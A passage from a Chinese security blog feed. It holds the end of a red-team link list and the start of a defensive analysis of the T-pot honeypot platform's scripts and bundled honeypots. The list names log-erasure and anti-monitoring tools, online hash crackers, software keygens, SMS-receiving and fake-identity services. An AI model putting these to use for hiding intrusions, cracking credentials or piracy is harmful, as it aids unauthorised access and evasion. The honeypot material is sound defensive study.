id="匿名信息保护洋葱路由-TorBrowser"><a href="#匿名信息保护洋葱路由-TorBrowser" class="headerlink" title="匿名信息保护洋葱路由 TorBrowser#"></a><strong>匿名信息保护洋葱路由 TorBrowser</strong>#</h2><ul><li><p><a href="https://github.com/leitbogioro/Fuck_Aliyun">https://github.com/leitbogioro/Fuck_Aliyun</a> 关闭阿里云监控服务</p></li><li><p><a href="https://github.com/Nummer/Destroy-Windows-10-Spying">https://github.com/Nummer/Destroy-Windows-10-Spying</a> DWS 关闭 windows 监控服务</p></li><li><p><a href="https://github.com/Rizer0/Log-killer">https://github.com/Rizer0/Log-killer</a> 日志清除，Windows/Linux 服务器中的所有</p></li><li><p><a href="https://github.com/360-A-Team/EventCleaner">https://github.com/360-A-Team/EventCleaner</a> 日志擦除工具</p></li><li><p><a href="https://github.com/s-rah/onionscan">https://github.com/s-rah/onionscan</a> darkweb 暗网爬虫</p></li><li><p><a href="https://github.com/globaleaks/Tor2web">https://github.com/globaleaks/Tor2web</a> darkweb 暗网代理服务器，将 onion 的服务变为普通的服务</p></li><li><p><a href="https://github.com/milesrichardson/docker-onion-nmap">https://github.com/milesrichardson/docker-onion-nmap</a> 使用 nmap 扫描 Tor 网络上隐藏的”onion”服务</p></li><li><p><a href="https://github.com/GouveaHeitor/nipe">https://github.com/GouveaHeitor/nipe</a> 一个使所有流量通过 Tor 网络发出的脚本</p></li><li><p><a href="https://github.com/trimstray/multitor">https://github.com/trimstray/multitor</a> 启用多个 tor 通道转发流量，并设置负载均衡</p></li></ul><h2 id="爬虫相关"><a href="#爬虫相关" class="headerlink" title="爬虫相关#"></a><strong>爬虫相关</strong>#</h2><ul><li><p><a href="https://github.com/alphardex/looter">https://github.com/alphardex/looter</a> 轻量型爬虫框架，类比 Scrapy</p></li><li><p><a href="https://github.com/luyishisi/Anti-Anti-Spider">https://github.com/luyishisi/Anti-Anti-Spider</a> 过反爬虫</p></li><li><p><a href="https://github.com/xchaoinfo/fuck-login">https://github.com/xchaoinfo/fuck-login</a> 模拟登录一些常见的网站</p></li><li><p><a href="https://github.com/Maicius/InterestingCrawler">https://github.com/Maicius/InterestingCrawler</a> 抓取 QQ 空间说说内容并进行分析</p></li><li><p><a href="https://github.com/xjr7670/QQzone_crawler">https://github.com/xjr7670/QQzone_crawler</a> QQ 空间动态爬虫，利用 cookie 登录获取所有可访问好友空间的动态保存到本地</p></li></ul><h2 id="在线自服务与工具"><a href="#在线自服务与工具" class="headerlink" title="在线自服务与工具#"></a><strong>在线自服务与工具</strong>#</h2><ul><li><p><a href="https://github.com/Kickball/awesome-selfhosted">https://github.com/Kickball/awesome-selfhosted</a> awesome 系列之自服务应用</p></li><li><p><a href="https://github.com/littlecodersh/itchat">https://github.com/littlecodersh/itchat</a> 微信个人号接口、微信机器人及命令行微信</p></li><li><p><a href="https://github.com/sym233/core-values-encoder">https://github.com/sym233/core-values-encoder</a> js,社会主义核心价值观加密，<a href="https://sym233.github.io/core-values-encoder/">https://sym233.github.io/core-values-encoder/</a></p></li><li><p><a href="https://github.com/valentinxxx/nginxconfig.io/">https://github.com/valentinxxx/nginxconfig.io/</a> 在线 nginx 配置文件生成，demo 网址 <a href="https://nginxconfig.io/">https://nginxconfig.io</a></p></li><li><p><a href="https://github.com/asciimoo/searx">https://github.com/asciimoo/searx</a> 搭建一个自己的搜索引擎,DEMO 网址 <a href="https://searx.me/">https://searx.me/</a></p></li><li><p><a href="http://sc.ftqq.com/3.version">http://sc.ftqq.com/3.version</a> server 酱微信通知</p></li><li><p><a href="https://osint.link/">https://osint.link</a> Open Source Intelligence (OSINT) Tools &amp; Resources</p></li><li><p><a href="https://www.wolframalpha.com/">https://www.wolframalpha.com</a> 根据问题直接给出答案的网站</p></li><li><p>shodan.io 互联网感知引擎</p></li><li><p>fofa.so 白帽汇 NOSEC</p></li><li><p><a href="https://www.oshadan.com/">https://www.oshadan.com</a> 傻蛋联网设备搜索 _ 湖南安数网络</p></li><li><p>zoomeye.org 知道创宇互联网感知引擎</p></li><li><p><a href="https://sms.cngrok.com/receiving-sms">https://sms.cngrok.com/receiving-sms</a> 收码接码</p></li><li><p><a href="https://www.pdflibr.com/">https://www.pdflibr.com/</a> 收码接码</p></li><li><p><a href="https://www.fakenamegenerator.com/">https://www.fakenamegenerator.com</a> 多国身份信息模拟器</p></li><li><p><a href="https://recruitin.net/">https://recruitin.net</a> Easily use Google to search profiles on LinkedIn</p></li><li><p><a href="https://www.truthfinder.com/">https://www.truthfinder.com</a> 美国公民信息查询</p></li><li><p><a href="https://verify-email.org/">https://verify-email.org</a> 邮件真实性验证</p></li><li><p><a href="https://safeweb.norton.com/">https://safeweb.norton.com</a> 诺顿网站安全检测</p></li><li><p><a href="http://www.vuln.cn/tools/ftp">http://www.vuln.cn/tools/ftp</a> 在线 FTP 登录</p></li><li><p><a href="http://www.link114.cn/title/">http://www.link114.cn/title/</a> 批量查询网站标题</p></li><li><p><a href="https://www.whatweb.net/">https://www.whatweb.net/</a> 在线 web 指纹识别</p></li><li><p><a href="https://hackertarget.com/ip-tools/">https://hackertarget.com/ip-tools/</a> 提供 api，ip 相关工具、在线扫描器</p></li><li><p><a href="http://www.webscan.cc/">http://www.webscan.cc/</a> 同 IP 网站查询,C 段查询,IP 反查域名,C 段旁注,旁注工具</p></li><li><p><a href="https://www.phpinfo.me/bing.php">https://www.phpinfo.me/bing.php</a> 在线旁站查询|C 段查询|必应接口 C 段查询</p></li><li><p><a href="https://www.phpinfo.me/domain/">https://www.phpinfo.me/domain/</a> 在线子域名爆破</p></li><li><p><a href="https://www.dnsdb.io/">https://www.dnsdb.io</a> DNS 查询,子域名查询,IP 查询,A 记录查询,域名解析,旁站查询</p></li><li><p><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a> dns recon and research, find and lookup dns records</p></li><li><p><a href="http://ip.chaxun.la/">http://ip.chaxun.la/</a> ip 反查域名—查询啦</p></li><li><p><a href="https://habo.qq.com/">https://habo.qq.com</a> 在线恶意文件检测</p></li><li><p><a href="https://www.virustotal.com/">https://www.virustotal.com</a> 恶意软件检测</p></li><li><p><a href="http://r.virscan.org/">http://r.virscan.org/</a> 恶意软件检测</p></li><li><p><a href="https://www.appscan.io/">https://www.appscan.io</a> 移动软件在线检测</p></li><li><p><a href="https://www.nomoreransom.org/">https://www.nomoreransom.org</a> 常见勒索软件分析还原</p></li><li><p><a href="https://www.cmd5.com/">https://www.cmd5.com/</a> HASH 密码在线破解</p></li><li><p><a href="https://www.onlinehashcrack.com/">https://www.onlinehashcrack.com</a> 密码哈希在线破解，邮件通知</p></li></ul><h2 id="在线办公套件"><a href="#在线办公套件" class="headerlink" title="在线办公套件#"></a><strong>在线办公套件</strong>#</h2><ul><li><p><a href="https://sadd.io/">https://sadd.io/</a> 在线操作系统</p></li><li><p><a href="https://github.com/zyx0814/dzzoffice">https://github.com/zyx0814/dzzoffice</a> 在线办公套件,DEMO 网址 demo.dzzoffice.com</p></li><li><p><a href="https://github.com/RobbieHan/gistandard">https://github.com/RobbieHan/gistandard</a> py，基于 Django，OA 工单办公管理系统</p></li><li><p><a href="https://github.com/pavanw3b/sh00t">https://github.com/pavanw3b/sh00t</a> PY3,DJANGO，安全测试工单管理</p></li><li><p><a href="https://github.com/chaitin/strapdown-zeta">https://github.com/chaitin/strapdown-zeta</a> 基于 strapdown.js，长亭二次开发开源的 Wiki 系统，支持 markdown</p></li><li><p><a href="https://etherpad.net/">https://etherpad.net/</a> 在线可编辑记事本</p></li><li><p><a href="https://www.upload.ee/">https://www.upload.ee/</a> 文件共享平台</p></li><li><p><a href="https://github.com/micahflee/onionshare">https://github.com/micahflee/onionshare</a> 利用 onion 洋葱服务器匿名文件共享</p></li><li><p><a href="https://github.com/filebrowser/filebrowser">https://github.com/filebrowser/filebrowser</a> GO,基于 Caddy 框架的网盘</p></li><li><p><a href="https://github.com/nextcloud/server">https://github.com/nextcloud/server</a> php，私有云网盘，owncloud 分支</p></li><li><p><a href="https://github.com/owncloud/core">https://github.com/owncloud/core</a> php，私有云网盘，界面不美观</p></li><li><p><a href="https://github.com/haiwen/seafile">https://github.com/haiwen/seafile</a> C,私有云网盘，速度快，功能少</p></li><li><p><a href="https://github.com/ymfe/yapi">https://github.com/ymfe/yapi</a> API 管理工具</p></li><li><p><a href="https://thyrsi.com/">https://thyrsi.com/</a> 图片上传分享工具</p></li></ul><h2 id="隐私匿名加密"><a href="#隐私匿名加密" class="headerlink" title="隐私匿名加密#"></a><strong>隐私匿名加密</strong>#</h2><ul><li><p><a href="https://www.lshack.cn/118/">https://www.lshack.cn/118/</a> 在线接收验证码/邮箱/粘贴板/文件传输大集合。</p></li><li><p><a href="http://bccto.me/">http://bccto.me</a> 一次性邮箱</p></li><li><p><a href="https://www.guerrillamail.com/">https://www.guerrillamail.com</a> 一次性邮箱</p></li><li><p><a href="http://24mail.chacuo.net/">http://24mail.chacuo.net/</a> 一次性邮箱</p></li><li><p><a href="http://www.yopmail.com/">http://www.yopmail.com</a> 一次性邮箱</p></li><li><p><a href="https://yandex.com/">https://yandex.com/</a> 非手机邮箱</p></li><li><p><a href="https://mail.ru/">https://mail.ru/</a> 非手机邮箱</p></li><li><p><a href="https://mail.protonmail.com/login">https://mail.protonmail.com/login</a> 非手机邮箱</p></li><li><p><a href="https://github.com/walkor/workerman-chat">https://github.com/walkor/workerman-chat</a> php，在线聊天室，可扩展</p></li><li><p><a href="https://github.com/hack-chat">https://github.com/hack-chat</a> <a href="https://hack.chat/?your-channel">https://hack.chat/?your-channel</a> js,在线聊天，问号后面跟你的房间名</p></li><li><p><a href="https://github.com/akaxincom/openzaly">https://github.com/akaxincom/openzaly</a> java,聊天室，Akaxin 为客户端闭源</p></li><li><p><a href="https://github.com/RocketChat/Rocket.Chat">https://github.com/RocketChat/Rocket.Chat</a> js,在线团队聊天服务器，<a href="https://rocket.chat/install">https://rocket.chat/install</a></p></li><li><p><a href="https://telegram.org/">https://telegram.org</a></p></li><li><p><a href="https://www.whatsapp.com/">https://www.whatsapp.com</a></p></li><li><p><a href="https://wire.com/en">https://wire.com/en</a></p></li><li><p><a href="https://signal.org/">https://signal.org</a></p></li><li><p><a href="http://www.batmessenger.com/">http://www.batmessenger.com</a></p></li><li><p><a href="http://sid.co/">http://sid.co</a></p></li></ul><h2 id="在线资源"><a href="#在线资源" class="headerlink" title="在线资源#"></a><strong>在线资源</strong>#</h2><ul><li><p><a href="https://github.com/DoubleLabyrinth/navicat-keygen">https://github.com/DoubleLabyrinth/navicat-keygen</a> navicat 注册机</p></li><li><p><a href="https://github.com/DoubleLabyrinth/MobaXterm-keygen">https://github.com/DoubleLabyrinth/MobaXterm-keygen</a> MobaXterm 注册机</p></li><li><p><a href="http://www.zdfans.com/">http://www.zdfans.com</a> zd423 - 软件分享平台领跑者</p></li><li><p><a href="https://www.flaticon.com/">https://www.flaticon.com</a> 免费图标网站</p></li><li><p><a href="https://msdn.itellyou.cn/">https://msdn.itellyou.cn</a> 原生镜像</p></li><li><p><a href="https://www.freenom.com/">https://www.freenom.com</a> 注册免费域名，dns 解析</p></li><li><p><a href="https://codebeautify.org/">https://codebeautify.org</a> 在线代码美化</p></li><li><p><a href="http://patorjk.com/">http://patorjk.com</a> Text to ASCII Art Generator</p></li><li><p><a href="https://www.seopojie.com/">https://www.seopojie.com</a> SPAM,SEO</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;转载于：&lt;a href=&quot;https://www.lshack.cn/772/&quot;&gt;https://www.lshack.cn/772/&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;项目简介&quot;&gt;&lt;a href=&quot;#项目简介&quot; class=&quot;headerlink&quot; title=&quot;项目简介#</summary>
      
    
    
    
    <category term="资料收集" scheme="https://greydr34d.github.io/categories/%E8%B5%84%E6%96%99%E6%94%B6%E9%9B%86/"/>
    
    <category term="红队" scheme="https://greydr34d.github.io/categories/%E8%B5%84%E6%96%99%E6%94%B6%E9%9B%86/%E7%BA%A2%E9%98%9F/"/>
    
    
    <category term="red team" scheme="https://greydr34d.github.io/tags/red-team/"/>
    
    <category term="资料收集" scheme="https://greydr34d.github.io/tags/%E8%B5%84%E6%96%99%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>T-pot项目分析</title>
    <link href="https://greydr34d.github.io/2021/02/05/T-pot%E9%A1%B9%E7%9B%AE%E5%88%86%E6%9E%90/"/>
    <id>https://greydr34d.github.io/2021/02/05/T-pot%E9%A1%B9%E7%9B%AE%E5%88%86%E6%9E%90/</id>
    <published>2021-02-05T08:26:55.000Z</published>
    <updated>2021-03-13T08:34:52.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="T-pot结构分析"><a href="#T-pot结构分析" class="headerlink" title="T-pot结构分析"></a>T-pot结构分析</h1><h2 id="0x01-目录结构"><a href="#0x01-目录结构" class="headerlink" title="0x01 目录结构"></a>0x01 目录结构</h2><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210128155902933.png" alt="image-20210128155902933"></p><h3 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h3><p>存放了一系列bash脚本</p><h4 id="2fa-sh"><a href="#2fa-sh" class="headerlink" title="2fa.sh"></a>2fa.sh</h4><p>用于Cockpit的双因素认证。原文中这样描述</p><blockquote><p>SSH and web access</p><p>By default, the SSH daemon allows access on <strong>tcp/64295</strong> with a user / password combination and prevents credential brute forcing attempts using <code>fail2ban</code>. This also counts for Admin UI (<strong>tcp/64294</strong>) and Web UI (<strong>tcp/64297</strong>) access.</p><p>If you do not have a SSH client at hand and still want to access the machine via command line you can do so by accessing the Admin UI from <code>https://&lt;your.ip&gt;:64294</code>, enter</p><ul><li>user: <strong>[tsec or user]</strong> <em>you chose during one of the post install methods</em></li><li>pass: <strong>[password]</strong> <em>you chose during the installation</em></li></ul><p>You can also add two factor authentication to Cockpit just by running <code>2fa.sh</code> on the command line.</p></blockquote><p>也就是说可以在终端执行2fa.sh开启双因素认证，提高系统访问控制策略。</p><p>下面是双因素认证的说明：</p><blockquote><p>什么是双因素认证???</p><p>　从密码学理论上说,用于身份认证主要有三方面要素:一是需要用户记忆的身份认证内容,例如密码或×××号码等;二是用户拥有认证硬件,例如USB Key,智能卡(以下简称IC 卡),磁卡等;三是用户本身拥有的唯一特征,例如指纹、瞳孔、声音等。单独来看,每个要素独立存在时,都有其脆弱性。而把两种要素结合起来,实现双重要素认证,可以有效提高系统访问控制的安全性,就是双因素认证。</p><p>　　双因素认证是一种适合企业的访问控制策略, 它将访问控制过程中个人身份识别更客观化, 有效地防止来自外部的身份欺诈和来自内部的更隐蔽的网络侵犯。一般的企业都有标识身份的员工IC 卡,可以利用这张卡来实现双因素认证。基于过多增加企业信息化成本的角度出发,以下方案采用的是员工卡IC卡+用户密码来进行安全访问控制。</p><p>参考：<a href="https://blog.51cto.com/victorly/2346430">双因素认证(two-factor authentication)</a></p></blockquote><h4 id="backup-es-folders-sh"><a href="#backup-es-folders-sh" class="headerlink" title="backup_es_folders.sh"></a>backup_es_folders.sh</h4><p>备份所有和Elasticsearch相关的文件</p><p><code>elkall_$(date +%Y%m%d%H%M).tgz</code></p><p><code>elkbase_$(date +%Y%m%d%H%M).tgz</code></p><p>的形式存放在<code>/data/elk/data</code>下</p><h4 id="change-ews-config-sh"><a href="#change-ews-config-sh" class="headerlink" title="change_ews_config.sh"></a>change_ews_config.sh</h4><p>ewsposte用于<strong>收集</strong>来自不同蜜罐（例如Glastopf，Honeytrap，Dionaea，Cowrie，Kippo，eMobility，Conpot，Elasticpot，Mailoney，RDPY，VNClowPot，Heralding，Ciscoasa，Tanner和Clutton）的日志和警报）并将其传输到Peba</p><p>默认情况下，T-pot会把收集到的数据发送到<a href="https://sicherheitstacho.eu/">Sicherheitstacho</a>以对其进行支持。</p><p>此文件用于修改其配置</p><h4 id="clean-sh"><a href="#clean-sh" class="headerlink" title="clean.sh"></a>clean.sh</h4><p>日志数据过多的时候进行清除与文件夹重建，部分文件进行压缩还原操作</p><h4 id="dps-sh"><a href="#dps-sh" class="headerlink" title="dps.sh"></a>dps.sh</h4><p>用于检查各个服务是否工作正常</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210129160510160.png" alt="image-20210129160510160"></p><h4 id="dump-es-sh"><a href="#dump-es-sh" class="headerlink" title="dump_es.sh"></a>dump_es.sh</h4><p>导出es所有数据</p><h4 id="export-kibana-objects-sh"><a href="#export-kibana-objects-sh" class="headerlink" title="export_kibana-objects.sh"></a>export_kibana-objects.sh</h4><p>导出所有Kibana对象，包括索引、仪表盘、可视化模块、搜索、配置等</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210129160413357.png" alt="image-20210129160413357"></p><h4 id="hpfeeds-optin-sh"><a href="#hpfeeds-optin-sh" class="headerlink" title="hpfeeds_optin.sh"></a>hpfeeds_optin.sh</h4><p>hpfeeds是一个轻量级的验证发布-订阅协议，使用这个脚本可以配置ews服务，以便自己的数据发送到第三方。</p><p>hpfeeds协议可参考：</p><p><a href="https://das.scusec.org/2016/02/19/hpfeeds/">蜜罐中常用协议——HPFEEDS协议</a></p><h4 id="hptest-sh"><a href="#hptest-sh" class="headerlink" title="hptest.sh"></a>hptest.sh</h4><p>简单测试T-pot是否正常工作的脚本，基于nmap</p><h4 id="import-kibana-objects-sh"><a href="#import-kibana-objects-sh" class="headerlink" title="import_kibana-objects.sh"></a>import_kibana-objects.sh</h4><p>导入kibana配置脚本</p><h4 id="myip-sh"><a href="#myip-sh" class="headerlink" title="myip.sh"></a>myip.sh</h4><p>获取此主机的外部IP</p><h4 id="mytopips-sh"><a href="#mytopips-sh" class="headerlink" title="mytopips.sh"></a>mytopips.sh</h4><p>测试ES是否正常工作</p><h4 id="restore-es-sh"><a href="#restore-es-sh" class="headerlink" title="restore_es.sh"></a>restore_es.sh</h4><p>恢复ES备份，与上面的change_ews_config.sh配合使用</p><h4 id="rule-sh"><a href="#rule-sh" class="headerlink" title="rule.sh"></a>rule.sh</h4><p>配置iptable防火墙的脚本。如果我们要对T-pot进行修改，必须确保iptable中也得到相应配置</p><h4 id="tped-sh（重要）"><a href="#tped-sh（重要）" class="headerlink" title="tped.sh（重要）"></a>tped.sh（重要）</h4><p>如果你修改了<code>docker-compose</code>文件或者使用了不同类型架构，如在standard与collector之间切换，就可以重新链接<code>tpot.yml</code>，然后运行<code>tped.sh</code>选择相应版本，这个脚本非常方便，我们只需要添加新的或者修改原有的docker-compose.yml文件，就可以定制服务。</p><p>在更新时也需要用到<code>tped.sh</code>，首先运行<code>/opt/tpot/update.sh</code>，然后重启运行<code>tped.sh</code>，选择NextGen安装。</p><h4 id="unlock-es-sh"><a href="#unlock-es-sh" class="headerlink" title="unlock_es.sh"></a>unlock_es.sh</h4><p>硬盘使用达到上限后，ES会锁定索引的读写，进行磁盘清理之后可以使用此脚本进行解锁。</p><h4 id="updateip-sh"><a href="#updateip-sh" class="headerlink" title="updateip.sh"></a>updateip.sh</h4><p>更新获取外部IP</p><h3 id="cloud"><a href="#cloud" class="headerlink" title="cloud"></a>cloud</h3><p>云部署相关资料</p><h3 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h3><blockquote><h5 id="Standard"><a href="#Standard" class="headerlink" title="Standard"></a>Standard</h5><ul><li>Honeypots: adbhoney, ciscoasa, citrixhoneypot, conpot, cowrie, dicompot, dionaea, elasticpot, heralding, honeysap, honeytrap, mailoney, medpot, rdpy, snare &amp; tanner</li><li>Tools: cockpit, cyberchef, ELK, fatt, elasticsearch head, ewsposter, nginx / heimdall, spiderfoot, p0f &amp; suricata</li></ul></blockquote><h4 id="Honeypots"><a href="#Honeypots" class="headerlink" title="Honeypots"></a>Honeypots</h4><p>**<a href="https://github.com/huuck/ADBHoney">adbhoney</a>**：一种为Android Debug Bridge （ADB）设计的蜜罐，ADB服务可以暴露在5555端口，该蜜罐用于捕获攻击者将恶意软件发送到5555端口的行为。</p><p>**<a href="https://github.com/Cymmetria/ciscoasa_honeypot">ciscoasa</a>**：用于Cisco ASA组件的低交互蜜罐，能够检测CVE-2018-0101，DoS和远程代码执行漏洞</p><p>**<a href="https://github.com/MalwareTech/CitrixHoneypot">citrixhoneypot</a>**：适用于CVE-2019-19781的Honepot，检测并记录CVE-2019-19781扫描和利用尝试。 监听端口443.</p><p>**<a href="http://conpot.org/">conpot</a>**：低交互工控蜜罐，提供一系列通用工业控制协议, 能够模拟复杂的工控基础设施。其监听端口为1025、50100、10001、623、161</p><p>**<a href="https://github.com/cowrie/cowrie">cowrie</a>**：基于kippo更改的中交互ssh蜜罐, 可以对暴力攻击账号密码等记录，并提供伪造的文件系统环境记录黑客操作行为, 并保存通过wget/curl下载的文件以及通过SFTP、SCP上传的文件。</p><p>**<a href="https://github.com/nsmfoo/dicompot">dicompot</a>**：医学数字成像和通信（DICOM）蜜罐，其监听端口为11112</p><p>**<a href="https://github.com/DinoTools/dionaea">dionaea</a>**：dionaea是运行于Linux上的一个应用程序，将程序运行于网络环境下，它开放Internet常见服务的默认端口，当有外来连接时，模拟正常服务给予反馈，同时记录下出入网络数据流。网络数据流经由检测模块检测后按类别进行处理，如果有 shellcode 则进行仿真执行；程序会自动下载 shellcode 中指定或后续攻击命令指定下载的恶意文件。其监听端口很多，包括20-21、42、81、135、445、1433、1723、1883、3306、1883、69、5060udp、5061、27017</p><p><strong><a href="https://gitlab.com/bontchev/elasticpot">elasticpot</a>:</strong> 模拟elastcisearch RCE漏洞的蜜罐，通过伪造函数在/,/search, /nodes的请求上回应脆弱ES实例的JSON格式消息。</p><p>**<a href="https://github.com/johnnykv/heralding">heralding</a>**：收集口令的蜜罐，当前支持：ftp，telnet，ssh，http，https，pop3，pop3s，imap，imaps，smtp，vnc，postgresql和socks5。T-pot里默认监听110、143、993、995、1080、5432、5900</p><p>**<a href="https://github.com/SecureAuthCorp/HoneySAP">honeysap</a>**：honeySAP是针对SAP服务的低交互性研究专用蜜罐</p><p>**<a href="https://github.com/armedpot/honeytrap/">honeytrap</a>**：观察针对TCP或UDP服务的攻击，作为一个守护程序模拟一些知名的服务，并能够分析攻击字符串，执行相应的下载文件指令。</p><p>**<a href="https://github.com/awhitehatter/mailoney">mailoney</a>**：SMTP蜜罐，监听端口25</p><p>**<a href="https://github.com/schmalle/medpot">medpot</a>**：HL7 / FHIR蜜罐，监听端口2575</p><p>**<a href="https://github.com/citronneur/rdpy">rdpy</a>**：Microsoft RDP（远程桌面协议）协议蜜罐，监听3389</p><p>**<a href="http://mushmush.org/">snare</a>**：一种Web应用程序蜜罐</p><p>**<a href="http://mushmush.org/">tanner</a>**：是一个远程数据分析和分类服务，用于评估HTTP请求并由<a href="https://github.com/mushorg/snare"><strong>snare</strong></a>服务响应。</p><p><strong><a href="https://github.com/p0f/p0f">p0f</a></strong> 是一个多功能工具，用于被动式获取 操作系统指纹 以识别远程主机操作系统，并且可以穿透防火墙。</p><p>**<a href="http://suricata-ids.org/">Suricata</a>**：一个网络监控引擎</p><h4 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h4><p><a href="https://cockpit-project.org/running">Cockpit</a>：一个轻量级的web ui，提供实时操作系统性能监控和web 终端管理</p><p><a href="https://gchq.github.io/CyberChef/">Cyberchef</a>：一个用户加密、编码、压缩和数据分析的web平台</p><p><a href="https://www.elastic.co/videos">ELK stack</a>：可视化展示T-pot收集到的事件</p><p><a href="https://mobz.github.io/elasticsearch-head/">Elasticsearch Head</a>：一个Web前端，用于浏览和与Elastic Search集群进行交互。</p><p><a href="https://github.com/telekom-security/ewsposter">ewsposter</a>：用于<strong>收集</strong>来自不同蜜罐（例如Glastopf，Honeytrap，Dionaea，Cowrie，Kippo，eMobility，Conpot，Elasticpot，Mailoney，RDPY，VNClowPot，Heralding，Ciscoasa，Tanner和Clutton）的日志和警报）并将其传输到Peba</p><p>nginx / heimdall：提供web ui，统一管理ELK与其他tools，需要以https输入账号密码访问，监听端口64297</p><p><a href="https://github.com/smicallef/spiderfoot">Spiderfoot</a>：一个开源智能自动化工具，用于开源威胁情报收集和数据分析</p><blockquote><p><strong>Conpot:</strong> 低交互工控蜜罐，提供一系列通用工业控制协议, 能够模拟复杂的工控基础设施。</p><p><strong>Cowrie:</strong> 基于kippo更改的中交互ssh蜜罐, 可以对暴力攻击账号密码等记录，并提供伪造的文件系统环境记录黑客操作行为, 并保存通过wget/curl下载的文件以及通过SFTP、SCP上传的文件。</p><p><strong>Dionaea:</strong> Dionaea是运行于Linux上的一个应用程序，将程序运行于网络环境下，它开放Internet常见服务的默认端口，当有外来连接时，模拟正常服务给予反馈，同时记录下出入网络数据流。网络数据流经由检测模块检测后按类别进行处理，如果有 shellcode 则进行仿真执行；程序会自动下载 shellcode 中指定或后续攻击命令指定下载的恶意文件。</p><p><strong>Elasticpot:</strong> 模拟elastcisearch RCE漏洞的蜜罐，通过伪造函数在/,/_search, /_nodes的请求上回应脆弱ES实例的JSON格式消息。</p><p><strong>Emobility:</strong> 在T-Pot中使用的高交互蜜罐容器， 旨在收集针对下一代交通基础设施的攻击动机和方法。Emobility蜜网包含一个中央收费系统，几个收费点，模拟用户的事务。一旦攻击者访问中控系统web界面，监控并处理运行收费交易，并与收费点交互。除此之外，在随机时间，黑客可能与正在收取车辆费用的用户进行交互。</p><p><strong>Glastopf:</strong> 低交互型Web应用蜜罐, Glastopf蜜罐它能够模拟成千上万的web漏洞，针对攻击的不同攻击手段来回应攻击者，然后从对目标Web应用程序的攻击过程中收集数据。它的目标是针对自动化漏洞扫描/利用工具，通过对漏洞利用方式进行归类，针对某一类的利用方式返回对应的合理结果，以此实现低交互。</p><p><strong>Honeytrap:</strong> 观察针对TCP或UDP服务的攻击，作为一个守护程序模拟一些知名的服务，并能够分析攻击字符串，执行相应的下载文件指令。</p><p><strong>Conpot:</strong> 低交互工控蜜罐，提供一系列通用工业控制协议, 能够模拟复杂的工控基础设施。</p><p><strong>Cowrie:</strong> 基于kippo更改的中交互ssh蜜罐, 可以对暴力攻击账号密码等记录，并提供伪造的文件系统环境记录黑客操作行为, 并保存通过wget/curl下载的文件以及通过SFTP、SCP上传的文件。</p><p><strong>Dionaea:</strong> Dionaea是运行于Linux上的一个应用程序，将程序运行于网络环境下，它开放Internet常见服务的默认端口，当有外来连接时，模拟正常服务给予反馈，同时记录下出入网络数据流。网络数据流经由检测模块检测后按类别进行处理，如果有 shellcode 则进行仿真执行；程序会自动下载 shellcode 中指定或后续攻击命令指定下载的恶意文件。</p><p><strong>Elasticpot:</strong> 模拟elastcisearch RCE漏洞的蜜罐，通过伪造函数在/,/_search, /_nodes的请求上回应脆弱ES实例的JSON格式消息。</p><p><strong>Emobility:</strong> 在T-Pot中使用的高交互蜜罐容器， 旨在收集针对下一代交通基础设施的攻击动机和方法。Emobility蜜网包含一个中央收费系统，几个收费点，模拟用户的事务。一旦攻击者访问中控系统web界面，监控并处理运行收费交易，并与收费点交互。除此之外，在随机时间，黑客可能与正在收取车辆费用的用户进行交互。</p><p><strong>Glastopf:</strong> 低交互型Web应用蜜罐, Glastopf蜜罐它能够模拟成千上万的web漏洞，针对攻击的不同攻击手段来回应攻击者，然后从对目标Web应用程序的攻击过程中收集数据。它的目标是针对自动化漏洞扫描/利用工具，通过对漏洞利用方式进行归类，针对某一类的利用方式返回对应的合理结果，以此实现低交互。</p><p><strong>Honeytrap:</strong> 观察针对TCP或UDP服务的攻击，作为一个守护程序模拟一些知名的服务，并能够分析攻击字符串，执行相应的下载文件指令。</p></blockquote><h3 id="etc"><a href="#etc" class="headerlink" title="etc"></a>etc</h3><p>etc目录目录结构如下：</p><div class="hljs code-wrapper"><pre><code class="hljs bash">.├── compose├── curator├── logrotate├── objects└── tpot.yml</code></pre></div><p>compose目录存放不同类型的配置文件，与我们安装时的选项相同，分别是：collector、industrial、medical、nextgen、sensor、standard</p><h4 id="Standard-yml"><a href="#Standard-yml" class="headerlink" title="Standard.yml"></a>Standard.yml</h4><h3 id="host"><a href="#host" class="headerlink" title="host"></a>host</h3><h3 id="iso"><a href="#iso" class="headerlink" title="iso"></a>iso</h3><h3 id="install-sh-安装脚本"><a href="#install-sh-安装脚本" class="headerlink" title="install.sh (安装脚本)"></a>install.sh (安装脚本)</h3><p>T-pot安装脚本</p><p>主要分为以下几个部分</p><ul><li>Global vars 设定全局变量</li><li>Functions 环境检查与配置函数</li><li>Pre-Installer 预安装</li><li>Prepare installer environmen 预安装环境</li><li>Installer user interaction phase 交互式安装过程</li><li>Installation phase 安装阶段</li></ul><h4 id="Functions"><a href="#Functions" class="headerlink" title="Functions"></a>Functions</h4><ul><li>功能性函数，比较重要的是<ul><li>fuGOT_ROOT 检查root</li><li>fuCHECKPACKAGES 安装apt-fast并检查依赖</li><li>fuCHECKNET 检查远程网址是否可以访问，网址为<ul><li><a href="https://ghcr.io/">https://ghcr.io</a> </li><li><a href="https://github.com/">https://github.com</a> </li><li><a href="https://pypi.python.org/">https://pypi.python.org</a> </li><li><a href="https://debian.org/">https://debian.org</a></li></ul></li><li>fuGET_DEPS 安装T-pot依赖<ul><li>dist-upgrade</li><li>安装依赖库</li><li>卸载有问题的包</li></ul></li><li>fuCHECK_PORTS 检查其他服务，通过端口判断</li></ul></li></ul><h4 id="Pre-Installer"><a href="#Pre-Installer" class="headerlink" title="Pre-Installer"></a>Pre-Installer</h4><ul><li>检查依赖，如果不完整会再次安装<ul><li>调用fuGOT_ROOT 、fuCHECKPACKAGES</li></ul></li></ul><h4 id="Prepare-installer-environmen"><a href="#Prepare-installer-environmen" class="headerlink" title="Prepare installer environmen"></a>Prepare installer 